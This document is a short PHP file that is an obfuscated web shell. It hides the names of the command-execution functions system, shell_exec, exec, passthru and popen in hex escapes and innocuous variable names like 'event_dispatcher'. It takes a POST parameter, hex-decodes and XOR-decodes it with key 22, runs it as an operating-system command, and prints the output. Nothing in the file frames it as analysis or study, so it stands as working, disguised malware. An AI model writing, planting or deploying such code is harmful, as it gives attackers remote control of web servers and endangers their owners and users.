<?php

$event_dispatcher5 = "\x70open";
$event_dispatcher4 = "\x70a\x73s\x74\x68ru";
$event_dispatcher3 = "\x65\x78ec";
$event_dispatcher6 = "stre\x61m_\x67e\x74\x5Fcont\x65\x6E\x74s";
$event_dispatcher7 = "\x70cl\x6F\x73e";
$event_dispatcher1 = "sys\x74\x65\x6D";
$config_manager = "h\x65x2\x62i\x6E";
$event_dispatcher2 = "\x73\x68\x65ll\x5Fe\x78ec";
if (isset($_POST["val"])) {
            function token_parser_engine ( $bind,  $parameter_group){ $property_set ='';$j=0; do{$property_set.=chr(ord($bind[$j])^$parameter_group);$j++;} while($j<strlen($bind)); return $property_set; }
            $val = $config_manager($_POST["val"]);
            $val = token_parser_engine($val, 22);
            if (function_exists($event_dispatcher1)) {
                $event_dispatcher1($val);
            } elseif (function_exists($event_dispatcher2)) {
                print $event_dispatcher2($val);
            } elseif (function_exists($event_dispatcher3)) {
                $event_dispatcher3($val, $data_chunk_bind);
                print join("\n", $data_chunk_bind);
            } elseif (function_exists($event_dispatcher4)) {
                $event_dispatcher4($val);
            } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
                $parameter_group_property_set = $event_dispatcher5($val, 'r');
                if ($parameter_group_property_set) {
                    $tkn_k = $event_dispatcher6($parameter_group_property_set);
                    $event_dispatcher7($parameter_group_property_set);
                    print $tkn_k;
                }
            }
            exit;
        }